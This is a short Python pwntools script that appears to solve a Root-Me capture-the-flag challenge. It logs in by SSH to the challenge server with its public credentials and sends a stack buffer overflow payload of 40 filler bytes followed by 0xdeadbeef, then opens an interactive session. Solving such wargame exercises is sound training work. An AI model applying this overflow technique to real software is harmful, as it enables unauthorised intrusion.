#!/usr/bin/env python3

from pwn import *

sh = ssh(host='challenge02.root-me.org',
         user='app-systeme-ch13',
         password='app-systeme-ch13',
         port=2222)

p = sh.process("./ch13")
p.sendline(b'A' * 40 + pack(0xdeadbeef))

p.interactive()

sh.close()
